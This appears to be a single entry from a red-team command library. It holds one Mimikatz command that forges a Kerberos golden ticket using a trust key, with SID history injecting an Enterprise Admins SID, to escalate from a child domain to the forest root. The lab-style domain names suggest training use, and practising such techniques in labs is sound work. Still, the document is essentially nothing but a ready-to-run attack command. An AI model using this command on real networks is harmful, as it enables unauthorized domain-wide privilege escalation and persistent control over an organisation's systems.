---
id: 273287aa-e699-419f-be61-79eb919494aa
name: Kerberos Golden Ticket
type: command
executor: bash
data: 'mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local
  /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519
  /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local
  /ticket:c:\ad\tools\mcorp-ticket.kirbi'
output: null
created_at: '2023-04-06T03:56:07.317598+00:00'
updated_at: '2023-04-10T20:26:18.505564+00:00'
---

# Kerberos Golden Ticket

```bash
mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\ad\tools\mcorp-ticket.kirbi
```


